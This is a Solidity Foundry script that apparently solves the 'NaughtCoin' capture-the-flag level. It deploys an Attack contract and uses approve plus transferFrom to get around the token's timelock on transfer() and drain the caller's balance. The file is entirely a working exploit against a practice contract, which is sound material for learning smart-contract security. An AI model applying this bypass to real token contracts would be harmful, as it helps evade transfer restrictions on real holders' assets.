// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "src/NaughtCoin.sol";

// 1.First we need need to create a contract named Attack
// 2.we should give approve to to other contract to transfer our tokens.
// 3.we should call transferFrom function

contract Attack {
    NaughtCoin  token;

    constructor(NaughtCoin _token){
        token = _token;
    }
    error Attack__transferFailed();

    function transfer() external{
        token.transferFrom(msg.sender ,address(this), token.balanceOf(msg.sender));
    }
}
contract Solve is Script {
    address instance = 0xc7cB627D4b45E7182Bf26193f5871a7A83B85b72;
    Attack attack;
    NaughtCoin token;
    function run() external {
        token = NaughtCoin(instance);
        vm.startBroadcast();
        attack = new Attack(token);
        token.approve(address(attack),token.balanceOf(msg.sender));
        attack.transfer();
        vm.stopBroadcast();
    }
}